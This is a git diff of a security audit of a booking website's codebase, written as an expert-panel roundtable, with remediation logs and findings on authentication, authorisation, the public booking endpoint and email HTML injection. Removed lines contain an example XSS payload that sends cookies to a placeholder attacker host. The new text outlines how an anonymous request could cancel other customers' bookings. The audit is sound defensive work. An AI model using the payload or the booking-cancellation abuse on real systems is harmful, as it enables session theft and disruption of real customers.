@@ -1,699 +1,320 @@
-# RMASA Website — Expert Security Panel Audit
+# RMASA Website — Expert Security Panel Audit (October 2026)
 
-> Roundtable review of the Royal Masa Arena booking-website codebase by Bruce Schneier,
-> Troy Hunt, James Kettle, Parisa Tabriz, and Simon Willison. Findings reference live code
-> paths in `src/`, `prisma/schema.prisma`, `middleware.ts`, and `next.config.ts`.
+> A roundtable review of the Royal MAS Arena booking site by Bruce Schneier, Troy Hunt,
+> James Kettle, Parisa Tabriz and Simon Willison. It covers the code on `main` at
+> `4c1ab79` (22 Oct 2026). Every finding points to a file and line in this repo.
 >
-> Scope: NextAuth + Cognito hybrid auth, admin RBAC, public booking endpoint,
-> per-slot/payment admin flows, transactional email (Resend), contact webhook, secrets
-> handling in Amplify SSR, and browser-side hardening.
-
-## Remediation log
-
-| Date | Finding | Status | Commit |
-|---|---|---|---|
-| 2026-05-18 | #1 — HTML email injection via unescaped customer/admin fields | **Fixed** — added `esc()` helper in `src/lib/email.ts` and wrapped all user/admin-supplied interpolations (`customerName`, `customerEmail`, `customerPhone`, `reference`, `roomName`, `eventTypeName`, `rejectReason`, per-slot `s.rejectReason`). | `2516117` |
-| 2026-05-18 | #2 — JWT role/active staleness | **Fixed** — both `requireAdmin()` and `requireSuperAdmin()` now re-read role + active from Postgres on every call. Inactive or demoted admins are rejected on the next request instead of waiting up to 4 hours for the JWT to expire. | `2516117` |
-| 2026-05-18 | #4 — Public booking endpoint spam | **Partially mitigated** — Cloudflare Turnstile bot protection is already in place on the booking form per `CLAUDE.md` § "Bot Protection: Cloudflare Turnstile". Remaining gaps closed by the 2026-05-19 row below; per-IP WAF rate limit still outstanding. | `b6b2c67` |
-| 2026-05-19 | #4 — Public booking endpoint, length caps | **Fixed** — `src/app/api/calendar/bookings/route.ts` and `src/app/api/contact/route.ts` now enforce hard limits on customer-supplied fields: name ≤ 100, email ≤ 254 (RFC 5321), phone ≤ 16 (digits + `+` only via `PHONE_PATTERN`), purpose / message ≤ 1000. Rejected with a 400 before any DB write. Remaining gap on this finding: no per-IP rate limit at the edge (WAF). | `b4b162b` |
-| 2026-05-19 | #3 — Two-admin race in `updateCalendarDb` | **Fixed** — `updateCalendarDb` removed entirely. Replaced by focused helpers (`insertBookingWithCascade`, `updateBookingStatus`, `updateBookingSlotStatus`, `updateBookingSlotsBatch`, `createCalendarBlock`, `deleteCalendarBlock`, `replaceCalendarConfig`) that each touch only the rows they actually change. The override cascade is atomic with the primary booking write. `replaceCalendarConfig` is wipe-and-recreate scoped to the three config tables only, so config edits no longer race with booking-queue actions. Conflict-check-inside-transaction is a separate follow-up. | `b4b162b` |
-| 2026-05-19 | #5 — PaymentEntry net-collected math conflated waivers with cash | **Fixed** — extracted pure helpers to `src/lib/payments.ts` (`computePaymentTotals`, `computeAmountDue`, `deriveReconciliationStatus`) and wired them into `POST /api/admin/calendar/bookings/[id]/payments`. Two independent counters: `netCash` (payments − refunds) and `totalDeducted` (waivers + credit notes). `paidAmountLkr` now stores cash only; `reconciliationStatus` derives from `(netCash, totalAmountLkr − totalDeducted)`. Covered by 11 unit tests in `src/lib/payments.test.ts` (run via `npm test`). CLAUDE.md "Net collected" section rewritten. Residual: admin-queue Overpaid tag still uses `paidAmountLkr > totalAmountLkr`, which misses the "cash matches invoice + waiver applied later → refund due" case. Documented as follow-up. | `99945d6` |
-| 2026-05-19 | #6 — No Content-Security-Policy header | **Fixed (enforcing)** — `next.config.ts` now serves CSP on every response. Tight host allowlist: `script-src` allows `'self' 'unsafe-inline'` plus `www.clarity.ms`, `*.clarity.ms`, `challenges.cloudflare.com`; `connect-src`, `img-src`, `style-src`, `font-src`, `frame-src` similarly minimal. `'unsafe-eval'` not included. `frame-ancestors 'none'` + `form-action 'self'` + `base-uri 'none'`. Dev mode may emit harmless CSP-eval warnings due to webpack source maps; production unaffected. Verified via `curl -I` across `/`, `/bookings`, `/admin/login`. | `7c8218b` |
+> **Scope:** NextAuth + Cognito hybrid auth, admin route guards, the anonymous public
+> booking and contact endpoints, the priority-override cascade, the payment ledger,
+> transactional email (Resend), the cron endpoint, CSP and third-party scripts,
+> Amplify secrets handling and dependencies.
 >
-> The product has **no AI surface and no file uploads today**, so Parts 4 and 5 are
-> reframed as: (4) Public booking endpoint — spam, abuse, scraping; (5) Email rendering
-> and HTML-injection trust boundaries. Simon Willison's contributions focus on
-> forward-looking AI risk (if customer-note summarisation or admin-assist is added later)
-> and on data-handling trust boundaries.
+> **Not in scope (does not exist in this app):** file uploads, LLM / AI pipelines,
+> Stripe, OAuth integrations other than Cognito, Supabase/RLS. The audit template
+> names these, but RMASA has none of them. Parts 4–6 are reframed to cover what the
+> app *does* have.
+>
+> **Method:** static review of every route under `src/app/api/`, the auth and store
+> libraries, admin server components, `next.config.ts`, `amplify.yml`, the GitHub
+> workflow, a git-history secret scan, and `npm audit --omit=dev`. No requests were
+> sent to production.
+
+---
+
+## Remediation log (October 2026)
+
+All ten quick wins are done on branch `claude/rmasa-security-audit-a5c50d`, except #10 (MFA), which is an AWS console change.
+
+| Finding | Status |
+|---|---|
+| F1 — anonymous override cascade | **Fixed.** The public POST passes `[]` to `insertBookingWithCascade` and sends no override emails. The cascade runs only on admin confirm. `scripts/restore-overridden-slots.mjs` reports and restores slots orphaned before the fix (dry run by default). |
+| F22 — *new, found while fixing F1:* client-sent `slotStatus` / `rejectReason` were written straight to `BookingSlot`, so an anonymous request could submit its own slots as `confirmed` (mass assignment) | **Fixed.** `normalizePublicSlots()` rebuilds slots from `date` + `startTime` only. |
+| F2 — client-controlled end time; past dates | **Fixed.** `endTime = startTime + durationMinutes` on the server; slots before today (Colombo) are rejected. |
+| F3 — unbounded slot count | **Fixed.** At most 50 base slots and 400 after recurrence. |
+| F4 — admin text in public responses | **Fixed.** `week-snapshot` omits `rejectReason` and sends block reasons as `"Unavailable"`. 409 reasons go through `toPublicConflictReason()`. *Visible change:* public calendar blocks now read "Unavailable" instead of the admin's note. |
+| F6 — Turnstile fail-open | **Fixed.** It fails closed in production and checks `hostname` against `NEXTAUTH_URL`'s host (plus www/apex twin and the optional `TURNSTILE_ALLOWED_HOSTNAMES`). |
+| F7 — admin pages trust the JWT | **Fixed.** `requireAdminPage()` (DB re-check) is used in the admin layout and hub page. The login page auto-forwards only active admins. |
+| F8 — CSV formula injection | **Fixed.** `csvCell()` / `csvRow()` in `src/lib/csv.ts` are used by the reports and revenue exports. |
+| F10 — Clarity on admin | **Fixed.** `ClarityAnalytics` skips `/admin/*`, stops and resumes on client-side navigation, and the admin section carries `data-clarity-mask`. |
+| F16 — `sharp` advisory, no Dependabot | **Fixed.** `sharp` 0.35.5 via `npm audit fix` (prod audit now 0); `.github/dependabot.yml` added. A dev-only `braces` advisory in `eslint-config-next` remains; its only fix is a breaking downgrade. |
+| F17 — cron logs on public repo | **Fixed.** The workflow prints the HTTP status only. |
+| F12 — MFA | **Open.** Enable TOTP MFA in the Cognito user pool (AWS console). |
+
+Tests: `public-booking-rules.test.ts`, `turnstile.test.ts`, `csv.test.ts`, `clarity-scope.test.ts`.
+
+---
+
+## Status of the May 2026 audit
+
+| # (May) | Finding | Status today |
+|---|---|---|
+| 1 | Unescaped HTML in emails | **Fixed.** Every user/admin interpolation in `src/lib/email.ts` goes through `esc()`. Slot dates and times are not escaped, but they are regex-validated upstream. |
+| 2 | JWT role/active staleness in API routes | **Fixed for API routes.** It is **not** fixed for admin *server components*. See new finding F7. |
+| 3 | `updateCalendarDb` race | **Fixed** (helper removed). |
+| 4 | Public booking spam | **Partly fixed.** Turnstile and length caps are in place. There is still no per-IP rate limit, and Turnstile fails open (F6). |
+| 5 | Waiver math | **Fixed** (`src/lib/payments.ts` plus tests). |
+| 6 | No CSP | **Fixed**, but `script-src 'unsafe-inline'` remains (F14). |
+| 7 | MFA off | **Still open** (deferred until the domain exists). |
+| 8 | Contact webhook unsigned, no timeout | **Still open.** |
+| 9 | 24-bit booking reference, no retry | **Still open.** `reference` is `@unique`, so a collision returns a 500. |
+| 10 | `CONTACT_WEBHOOK_URL` not baked for Amplify | **Still open.** The route now reads `_AMPLIFY_CONTACT_WEBHOOK_URL`, but `next.config.ts` never defines it, so the fallback is always `undefined`. |
+| 11 | Logout endpoint cached per Lambda | Still open (Low). |
+| 13 | `EmailLog.htmlBody` kept with no retention limit | Still open. |
+| 17 | No `Origin` check on admin mutations | Still open (Low). |
+| 19 | No Dependabot/Renovate | **Still open.** `.github/` contains only the cron workflow, and `npm audit` now reports a high-severity issue (F16). |
 
 ---
 
 ## Opening — first impressions
 
-**Schneier.** Threat model first. Who attacks this site, and what do they want?
+**Schneier:** I want to start with incentives, not code. Who wants to attack a sports-arena booking site? Not nation states. Think of a club that lost the Saturday slot to a rival, a disgruntled customer, a competitor venue, or a bored teenager. None of them need to steal data. They want to **disrupt bookings** or **get the hall cheaply**. So the important question is not "can they read the database?" It is "can an anonymous person change someone else's booking, or the price?" I'm afraid the answer to both is yes.
 
-  - A **competitor or disgruntled customer** who wants to deny service: bot-spam the public
-    booking endpoint, exhaust admin attention, fill the calendar with pending requests.
-  - A **commercial scraper** who wants the pricing matrix or the customer list (the latter
-    only via the admin surface, but the former is intentionally public).
-  - An **insider** — an admin acting out of scope, or a former admin whose JWT is still
-    valid after they were deactivated.
-  - An **opportunist** who finds the site indexed somewhere and tries email-based social
-    engineering against the admin via crafted customer-name fields in booking submissions.
+**Hunt:** The basics are in good shape. `requireAdmin()` re-reads the user row on every API call. Emails are escaped. Input lengths are capped. There are no secrets in git history; I scanned every commit for Resend keys, Neon URLs and AWS keys. The old `data/calendar-db.json` only ever held `123@test.com` test data. That is better than most small-business sites I see. The weak spots are business logic, not OWASP-scanner material.
 
-The codebase has clearly been hardened against direct technical attacks. The places that
-need work are the **integrity of the email channel** and the **freshness of authorisation
-decisions**.
+**Kettle:** I agree. I spent most of my time on `POST /api/calendar/bookings`. It is anonymous. It trusts the client for the slot *end* time. And it runs a cascade that mutates other customers' bookings before any human reviews anything. That is the centre of this audit.
 
-**Hunt.** OWASP shortlist. A01 broken access control — `requireAdmin`/`requireSuperAdmin`
-are consistently applied across `src/app/api/admin/*`. A02 cryptographic failures —
-nothing custom; NextAuth JWT signed with `NEXTAUTH_SECRET`. A03 injection — Prisma
-parameterises SQL; the live injection surface is **HTML email construction** in
-[`src/lib/email.ts`](src/lib/email.ts), where customer-supplied fields are interpolated
-verbatim. A07 auth — Cognito holds passwords + lockout; Postgres holds role + active;
-the seam is documented and the signIn callback enforces it. MFA is documented as deferred
-in `CLAUDE.md` — call it out.
+**Tabriz:** I'll take the platform side: Clarity is recording the admin panel, Turnstile fails open, admin server components skip the DB re-check, and the CSP is weaker than it looks. Plus a dependency advisory nobody would have noticed, because nothing is watching.
 
-**Kettle.** I'll be looking at the public-write endpoints (`/api/calendar/bookings`,
-`/api/contact`), the unauth GET endpoints that leak pricing/structure, the
-wipe-and-recreate transaction pattern in [`calendar-store.ts:122–263`](src/lib/calendar-store.ts#L122-L263),
-the payment-entry calculation, and the Cognito federated logout cache.
-
-**Tabriz.** This codebase is small and the secret-leak prebuild guard
-([`scripts/check-amplify-secret-leak.mjs`](scripts/check-amplify-secret-leak.mjs)) is the
-kind of belt-and-suspenders I want to see. Defence-in-depth gaps I expect to find: no CSP,
-no global rate limiting, JWT role-staleness across role/active changes, and the EmailLog
-table storing rendered customer-PII HTML indefinitely.
-
-**Willison.** No AI here, so my contribution is sparser than usual. I'll flag two things:
-the **HTML-stored-in-DB** pattern (EmailLog.htmlBody) is the kind of "everything looks fine
-until someone renders this in an admin UI later" that becomes XSS when AI-generated
-summaries inevitably get added in v2. And the customer-name/reject-reason fields are
-exactly the user-controlled text channel I'd worry about if any future feature pipes them
-into a model.
+**Willison:** There's no LLM in this codebase, so I'll do what I'd do anyway: follow untrusted strings to the places they end up. Customer-typed text reaches admin spreadsheets, third-party session recordings, public JSON and victims' inboxes. Those are the trust boundaries that matter here.
 
 ---
 
-## Part 1 — Authentication & Session Management
+## Part 1 — Authentication & session management
 
-**Hunt.** [`middleware.ts`](middleware.ts) is short and correct:
+**Hunt:** The flow is solid. Cognito holds credentials and lockout. The `signIn` callback in `src/lib/auth.ts:39-82` rejects emails that are missing from Postgres or marked inactive. The `next` param on `/admin/login` is restricted with `startsWith("/admin")` (`src/app/admin/login/page.tsx:14`), and NextAuth's default `redirect` callback limits `callbackUrl` to the same origin. So there's no open redirect.
 
-  - Force HTTPS on `/admin/*` for non-localhost when `x-forwarded-proto === "http"`
-    (lines 10–17). Amplify terminates TLS at the load balancer, so this header is
-    authoritative.
-  - `/admin/login` is whitelisted; everything else under `/admin/*` requires
-    `getToken({ req, secret: NEXTAUTH_SECRET })`.
-  - JWT session, 4 h `maxAge`, 15 min `updateAge` ([`auth.ts:6–13`](src/lib/auth.ts#L6-L13)).
+**Schneier:** Two policy gaps. First, MFA is off, and has been for five months, waiting on a domain. Cognito supports TOTP authenticator apps, which need no SES and no domain. Email MFA is blocked. TOTP never was. Second, the session lifetime: `maxAge: 4h` with `updateAge: 15min` (`auth.ts:6-12`) gives a sliding session. A stolen cookie on a shared front-desk PC stays alive as long as somebody keeps using it.
 
-The Cognito + Postgres hybrid in [`auth.ts:37–82`](src/lib/auth.ts#L37-L82) is exactly the
-pattern I'd recommend, *but* it has a critical staleness issue:
+**Kettle:** `cognitoSub` is trust-on-first-use (`auth.ts:68-74`). It's written once and **never compared afterwards**. If someone recreates a Cognito user with the same email in the pool, they inherit the Postgres admin row. The code accepts that silently. It should compare `profile.sub` with the stored `cognitoSub` when one exists and refuse on a mismatch.
 
-**The role and `active` flag are stamped onto the JWT at sign-in and not re-validated.**
-The `signIn` callback reads `dbUser.role` and `dbUser.active`, writes them to the JWT,
-and `requireAdmin` ([`auth-guards.ts:15–33`](src/lib/auth-guards.ts#L15-L33)) trusts the
-JWT-stamped role for the full 4-hour session. So:
-
-  - A user demoted from `super_admin` to `admin` keeps `super_admin` privileges for up
-    to 4 hours.
-  - A user with `active: false` keeps logging in (or, more precisely, stays logged in)
-    for up to 4 hours after deactivation.
-  - There is **no revocation channel**. Cognito sign-out only invalidates the Cognito
-    session; the NextAuth JWT remains valid until expiry.
-
-For an admin product where you can deactivate someone via the UI, this is a high-severity
-gap — the deactivate button promises something it doesn't deliver.
-
-**Schneier.** The fix is either:
-
-  1. Drop the JWT strategy and use database sessions, so every request hits Postgres.
-     Cheap on Aurora; you're already round-tripping for `readCalendarDb`. Or
-  2. Add a `session` callback (or a per-route wrapper around `requireAdmin`) that
-     re-reads `User.role` and `User.active` from Postgres and rejects if either changed.
-     Cache for 1–5 minutes if you want. The cost is one PK lookup per admin request.
-
-Either way: the **deactivate** button must invalidate live sessions, or it shouldn't exist.
-
-**Tabriz.** MFA. Per [`CLAUDE.md`](CLAUDE.md#auth) MFA is "currently off — deferred until
-`royalmasarena.lk` is registered." That's a documented, accepted risk, but it does mean
-every admin is single-factor. Cognito lockout helps against password-spray; it doesn't
-help against phishing. Move MFA up the priority list; SES email MFA is fine as a starter,
-and TOTP via authenticator app does not require domain verification.
-
-**Kettle.** The federated logout at
-[`auth/federated-logout/route.ts`](src/app/api/auth/federated-logout/route.ts) caches
-`cachedLogoutEndpoint` at module scope (line 5). Two observations:
-
-  1. If `COGNITO_ISSUER` is rotated post-deploy (e.g. user pool migration), the running
-     Lambda keeps the stale endpoint until next cold start. Low severity.
-  2. The endpoint discovery fetches `/.well-known/openid-configuration` with
-     `cache: "no-store"` *but* the module-level cache renders that flag moot. Either
-     decide it's cached (and add a TTL) or don't (and drop the cache). The current code
-     is "cached forever per Lambda instance."
-
-**Hunt.** `cognitoSub` backfill at first sign-in ([`auth.ts:69–75`](src/lib/auth.ts#L69-L75)):
-the `sub` from the Cognito OAuth profile is written to Postgres the first time the user
-logs in. **This is trust-on-first-use.** It relies on Cognito email uniqueness being
-enforced at the user-pool level. Cognito does not enforce email uniqueness by default —
-this is a config setting on the user pool. If a second Cognito account exists with the
-same email (configurable, or via a different sign-in source), the first to log in claims
-the Postgres row. Verify the user pool has `EMAIL` set as the alias-attribute with
-uniqueness enforced. This is a one-line check in the Cognito console but a code-invisible
-risk today.
-
-**Schneier.** The 4-hour `maxAge` combined with `updateAge: 15 min` means a session
-silently renews every 15 minutes of activity, so the effective ceiling is "until idle for
-4 hours." For admin sessions touching financial data, I'd argue **2 hours** with no auto-
-renewal — make the admin re-authenticate. That also bounds the role-staleness window.
+**Tabriz:** `GET /api/auth/federated-logout` is a GET with side effects. A cross-site `<img>` can log an admin out of Cognito. It's annoying rather than dangerous, so Low.
 
 ---
 
-## Part 2 — Authorisation & RBAC
+## Part 2 — Authorisation & admin isolation
 
-**Tabriz.** The role model is two-tier: `admin` and `super_admin`. `requireSuperAdmin`
-gates:
+**Hunt:** Every API route under `src/app/api/admin/` calls `requireAdmin()` or `requireSuperAdmin()` before doing anything. I checked all nine. Accounts management and `PUT /config` are super-admin only. Good.
 
-  - `POST/PATCH /api/admin/accounts/*` (admin account CRUD)
-  - `PUT /api/admin/calendar/config` (rooms, event types, pricing)
+**Tabriz:** But the **pages** don't use those guards. `src/app/admin/calendar/layout.tsx:11-15` and the hub at `src/app/admin/calendar/page.tsx:25-30` only call `getServerSession()`, which trusts the JWT. The hub then runs Prisma queries directly. It renders KPIs, revenue and the recent-activity table, which joins audit-log rows to customer names. The `revenue` and `schedule` pages work the same way. So the May fix ("deactivation takes effect on the next request") holds for `fetch('/api/...')` but **not** for server-rendered pages. A deactivated admin keeps read access to the hub for up to 4 hours. Because of the sliding session, it's open-ended if they keep refreshing.
 
-`requireAdmin` gates everything else under `/api/admin/*`. The split is consistent and
-readable.
+**Schneier:** That's precisely the case the deactivate button exists for: a staff member who leaves on bad terms. They're the person most likely to keep a tab open.
 
-**The last-super-admin guard** at
-[`accounts/[id]/route.ts:43–57`](src/app/api/admin/accounts/[id]/route.ts#L43-L57) is well
-done:
+**Kettle:** The layout also derives `isSuperAdmin` from the JWT role (`layout.tsx:17`). The APIs still enforce correctly, so a demoted super-admin only sees UI they can't use. That's cosmetic. The fix for both problems is a `requireAdminPage()` helper that runs `loadActiveAdmin()` and redirects. Call it from the layout, and the layout covers every child page.
 
-```ts
-if (target.role === "super_admin" && removesSuperAdminCapability) {
-  const otherActiveSuperAdminCount = await prisma.user.count({...});
-  if (otherActiveSuperAdminCount === 0) {
-    return NextResponse.json({ message: "Cannot remove the last active super admin..." });
-  }
-}
-```
-
-That prevents organisational lockout. The self-protection guards
-([accounts/[id]/route.ts:32–41](src/app/api/admin/accounts/[id]/route.ts#L32-L41)) catch
-self-deactivation and self-demotion.
-
-**Kettle.** One IDOR-shaped issue worth checking: the `PATCH /api/admin/calendar/bookings`
-batch path at [`bookings/route.ts:67–197`](src/app/api/admin/calendar/bookings/route.ts#L67-L197)
-trusts `payload.id` plus `payload.batchSlotUpdates[].slotDate/slotStartTime` from the
-request body to locate the rows to edit. The route correctly looks up `existing` by id
-and only mutates slots inside that booking. **But there's no ownership check beyond
-"admin role"** — any admin can patch any booking, regardless of who handled it earlier.
-That's the intended model for a small business, but it means the AuditLog is your *only*
-forensic trail. Confirm: every state-changing admin route is followed by
-`logAuditEvent` — quick scan says yes for `/api/admin/calendar/bookings`,
-`/api/admin/calendar/blocks`, `/api/admin/calendar/config`, `/api/admin/calendar/bookings/[id]/payments`,
-`/api/admin/accounts/*`. Good.
-
-**Hunt.** Two more authz observations:
-
-  1. `/api/calendar/config` ([`calendar/config/route.ts`](src/app/api/calendar/config/route.ts))
-     is unauth and returns the full pricing matrix. Acceptable for a public booking site
-     (customers need prices to make decisions), but it does mean **price-extraction is
-     trivial for competitors**. Decision, not a defect — flag for the business.
-  2. `/api/calendar/availability` is also unauth and reveals all blocked slots, all
-     existing bookings' time windows (through availability state). A scraper can map your
-     occupancy. Same call — intentional, but worth being explicit.
-
-**Schneier.** Insider threat: nothing in the codebase distinguishes "admin who handled the
-original booking" from "any admin." If you grow to multiple admins, you'll want a
-denormalised `handledByUserId` on `Booking` and per-admin filters on the queue. Today this
-is fine for the operating model.
+**Hunt:** One more in `PATCH /api/admin/accounts/[id]` (`route.ts:59-65`): `payload.role` goes to Prisma unvalidated. `"role":"owner"` becomes a Prisma enum error, which is a 500, not a 400. That isn't exploitable. But the "last active super admin" check (`:43-57`) is a read-then-write with no transaction. Two super-admins demoting each other at the same moment could leave zero. That is an unlikely race with a nasty result, and `SERIALIZABLE` or a conditional update fixes it.
 
 ---
 
-## Part 3 — API Security & Data Layer
+## Part 3 — API security: the public booking endpoint
 
-**Kettle.** Five things to flag.
+This is where the serious findings are.
 
-**1. The `updateCalendarDb` wipe-and-recreate pattern** at
-[`calendar-store.ts:116–264`](src/lib/calendar-store.ts#L116-L264) is *atomic* (wrapped in
-`prisma.$transaction(..., { timeout: 30_000 })`) but it's **read-modify-write at the
-application layer**. Two simultaneous admin actions both call `readCalendarDb` separately,
-mutate in memory, then enter the transaction. Inside the transaction it's serialised, but
-*the snapshot each one mutated was read outside the transaction*. So:
+### F1 — An anonymous customer can cancel other people's confirmed bookings (Critical)
 
-  - Admin A reads (state S₀), starts to confirm booking X.
-  - Admin B reads (state S₀), starts to reject slot in booking Y.
-  - A's transaction runs first: delete-everything, insert-state-S₀-with-X-confirmed.
-  - B's transaction runs next: delete-everything, insert-state-S₀-with-Y-rejected.
-  - **A's confirmation is silently reverted.**
+**Kettle:** Look at the order of operations in `src/app/api/calendar/bookings/route.ts`:
 
-This is the classic last-write-wins on a snapshot. With one admin it's invisible. With
-two it's a race against the wall clock. The mitigation is either:
+1. Line 413: `evaluateBookingConflicts(conflictDb, booking)`. For every existing booking whose event type has a **lower priority** than the candidate's, the overlap is recorded as an *override target*, not a conflict (`src/lib/calendar-core.ts:365-376`). Booking status is not checked here; `confirmed` is included.
+2. Line 427: `insertBookingWithCascade(...)` sets the overlapping slots of those bookings to `slotStatus = "cancelled_override"` **inside the same transaction that inserts the new `pending` booking** (`src/lib/calendar-store.ts:220-238`).
+3. Lines 461-494: each victim is emailed that their slot was cancelled.
 
-  - Optimistic concurrency: add a `version` column to one row (a `CalendarMeta` singleton
-    or each Booking); compare-and-swap inside the transaction.
-  - Or: stop using wipe-and-recreate. The route's named operation is "confirm booking";
-    write *just that* (`UPDATE booking SET status='confirmed', overriddenBookingIds=...`).
-    The wipe-and-recreate pattern is documented in `CLAUDE.md` as "delete order matters
-    for FK constraints" — that's a sign the data-access layer is too coarse.
+All of this happens when an **anonymous, unapproved** request is submitted. The new booking is only `pending`. An admin may reject it a minute later, but nothing restores the victim's slots. I grepped `calendar-store.ts` for any un-cancel path and there isn't one.
 
-This is high severity for a multi-admin org, even if it's invisible most days.
+**Schneier:** Spell out the attacker's playbook.
 
-**2. Booking reference collision.**
-[`bookings/route.ts:40–42`](src/app/api/calendar/bookings/route.ts#L40-L42):
-
-```ts
-function generateBookingReference(): string {
-  return "BK-" + randomBytes(3).toString("hex").toUpperCase();
-}
-```
-
-Three bytes = 24 bits = ~16.7 M values. The schema has `reference @unique`, so a
-collision throws a Prisma uniqueness error and the booking POST returns a 500 to the
-customer. At your current volume this is rare; at 10 k bookings the birthday-bound
-collision probability is non-trivial (≈ 1 %). Retry on `P2002` or widen to 4 bytes.
-
-**3. The PaymentEntry net-collected calculation is inconsistent with the schema docs.**
-[`payments/route.ts:75–80`](src/app/api/admin/calendar/bookings/[id]/payments/route.ts#L75-L80):
-
-```ts
-const net = [...booking.paymentEntries, entry].reduce(
-  (sum, e) => (e.type === "payment" ? sum + e.amountLkr : sum - e.amountLkr),
-  0,
-);
-```
-
-This subtracts *every non-payment type* — refunds, credit_notes, *and waivers*. Per
-`CLAUDE.md` § Calendar Data Model: **Net collected = Σ(payment) − Σ(refund) − Σ(credit_note) − Σ(waiver)**.
-The code matches the doc literally, but the doc itself is suspect: waivers don't reduce
-cash collected; they reduce the *amount due*. Today a "Fee Waiver" entry on a fully-paid
-booking would drop `paidAmountLkr` and change `reconciliationStatus` from `paid` to
-something else — that's a money-relevant accounting error. Worth a Bruce-style "what does
-the system actually mean by `paidAmountLkr`?" pass before you ship anything fancier.
-
-This straddles security and financial-correctness. Severity depends on whether anyone has
-actually used the `waiver` type yet — `CLAUDE.md` says "legacy value only going forward,"
-which suggests it's been recognised. Confirm the recognition has reached the code.
-
-**4. The wipe-and-recreate transaction runs many sequential INSERTs to Neon Singapore.**
-30 s timeout, but each booking is a separate `await tx.booking.create(...)` plus
-`createMany` for slots/breakdown/payments/overrides. With 200 bookings × 5 round-trips
-each, you're at 1000 sequential round-trips. From Amplify (presumably us-east-1) to Neon
-Singapore that's ~250 ms × 1000 = 4 minutes minimum. **The 30 s timeout will start firing
-before you reach the documented volume.** Move to bulk operations or move the DB to the
-same region as Amplify.
-
-(That's an availability/operational finding more than a security one, but a route that
-silently fails under load is a security problem when admins start working around it.)
-
-**5. No pagination on `GET /api/admin/calendar/bookings`** — returns all bookings + slots
-+ amountBreakdown + overrides + paymentEntries every time. Today it's fine; at 1k+
-bookings the admin page slows down and the response gets large. Set a hard limit and let
-the UI page.
-
-**Schneier.** The transaction integrity issue (#1) is one of those bugs that looks like a
-fluke when it bites: "weird, I confirmed that booking and it shows pending." Hard to
-forensic after the fact. Get optimistic concurrency in before you hire a second admin.
-
----
-
-## Part 4 — Public Booking Endpoint — Spam, Abuse, Scraping
-
-**Hunt.** `POST /api/calendar/bookings` is unauthenticated by design. It writes a Booking
-row, an email log row, and triggers two outbound Resend emails (acknowledgement + admin
-notification). Per call cost: ~3 DB writes + 2 SMTP sends. There is **no rate limit, no
-CAPTCHA, no proof-of-work, no honeypot field**.
-
-That gives an attacker:
-
-  - **Email bombing the admin inbox.** Submit 1000 forged bookings; admin gets 1000
-    "New Booking Request" emails. ADMIN_NOTIFICATION_EMAIL is the inbox; saturating it
-    has knock-on effects on real bookings being noticed.
-  - **Resend cost amplification.** Resend is metered. A bot can run up the email bill.
-  - **Calendar pollution.** Every submission is `status: "pending"` until an admin
-    rejects it. The conflict-detection logic at
-    [`evaluateBookingConflicts`](src/lib/calendar-core.ts) treats pending slots as
-    blocking for new bookings of lower priority, so a bot can effectively block out
-    high-value slots and force admin triage.
-  - **Customer-PII pollution.** Booking rows accumulate forever with no cleanup. A
-    spammer can dump 10 k garbage rows that an admin then has to manually clean.
-
-The standard quick fixes:
-
-  - **Per-IP rate limit** at the edge (Amplify CloudFront / WAF) — 5 requests / minute /
-    IP. Amplify supports WAF rules natively; configure.
-  - **Honeypot field** — render a hidden `<input name="company">` in the form; reject
-    any submission that fills it. Catches naive bots, zero UX cost.
-  - **hCaptcha / Cloudflare Turnstile** invisible challenge — costs an extra POST but
-    catches scripted abuse.
-  - **Hard length limits** on customer name (100), phone (40), email (254 — RFC), purpose
-    (1000). Today none are enforced.
-
-**Kettle.** Two enumeration vectors:
-
-  - `GET /api/calendar/availability?roomTypeId=…&eventTypeId=…&date=YYYY-MM-DD` reveals
-    occupancy state for any date. Loop dates, get a full calendar map. Intentional;
-    flag for the business.
-  - Booking *reference* values are partially predictable (6 hex chars). There's no
-    customer-facing "check my booking status" endpoint today, so reference is internal.
-    If you add one (and the email already shows the reference, so this is likely),
-    **don't let it be a sole identifier** for sensitive operations — pair it with email
-    + a one-time link.
-
-**Schneier.** The fundamental insight: the public booking endpoint is a write that costs
-the business money (Resend send + admin attention). Anything that costs money must have
-a rate limit. The fact that the abuse cost is real (Resend) and small (a few cents) means
-the right defence is *not* punitive — just deterrent. WAF rate limit + honeypot fixes
-95 % of it.
-
-**Hunt.** And while we're here: **`/api/contact`** is the same shape. Anonymous POST,
-fires an HTTP webhook to `CONTACT_WEBHOOK_URL`. Same spam vectors. Add the same defences.
-
-**Tabriz.** `CONTACT_WEBHOOK_URL` — the route at
-[`contact/route.ts:41–66`](src/app/api/contact/route.ts#L41-L66) takes the URL from env
-and POSTs to it with no signing key. If that webhook is downstream-CRM-grade, it should
-require HMAC over the body to prove it came from your origin. Today, anyone who knows
-the URL can submit fake leads. Sign with `crypto.createHmac('sha256', SHARED_SECRET).update(body)`.
-
----
-
-## Part 5 — Email Rendering & HTML-Injection Trust Boundaries
-
-**Hunt.** This is the headline finding.
-[`src/lib/email.ts`](src/lib/email.ts) constructs HTML email bodies by template-literal
-interpolation of customer-supplied fields. None of these fields are HTML-escaped:
-
-  - `customerName` ([`email.ts:173, 243, 263, 297, 343, 381`](src/lib/email.ts#L173)) —
-    customer-supplied via the public booking POST.
-  - `customerEmail` (multiple places, including inside `mailto:` and visible link text) —
-    customer-supplied.
-  - `customerPhone` ([`email.ts:345`](src/lib/email.ts#L345)) — customer-supplied.
-  - `rejectReason` ([`email.ts:236–239, 392`](src/lib/email.ts#L236-L239)) —
-    admin-supplied via the rejection modal.
-  - `roomName`, `eventTypeName` — admin-supplied via config.
-
-`reference` is server-generated and safe. Slot date/time strings are validated. Amounts
-are integers. The rest are typed `string` and arrive unescaped at the template literal.
-
-Concrete attack:
+**Kettle:** The attacker opens `/bookings`, picks the cheapest event type with a higher priority than Badminton (or whatever the target holds), selects slots over the victim's confirmed sessions, enters a throwaway email, solves Turnstile once, and submits. One request can contain many `selectedSlots` *and* a 26-occurrence weekly recurrence (`assertRecurrenceWindow`, `calendar-core.ts:396-417`). One submit can therefore wipe every lower-priority booking in a room for six months. Every affected customer gets an official "your booking was cancelled" email from the venue.
 
 ```http
 POST /api/calendar/bookings
-{
-  "customer": {
-    "name": "Yasiru<style>body{display:none}</style><h1>URGENT: payment overdue</h1>",
-    "email": "victim@example.com",
-    "phone": "<img src=x onerror=fetch('https://attacker/?c='+document.cookie)>",
-    ...
-  }
-}
+{ "roomTypeId": "<main-arena>", "eventTypeId": "<higher-priority type>",
+  "acMode": "without_ac",
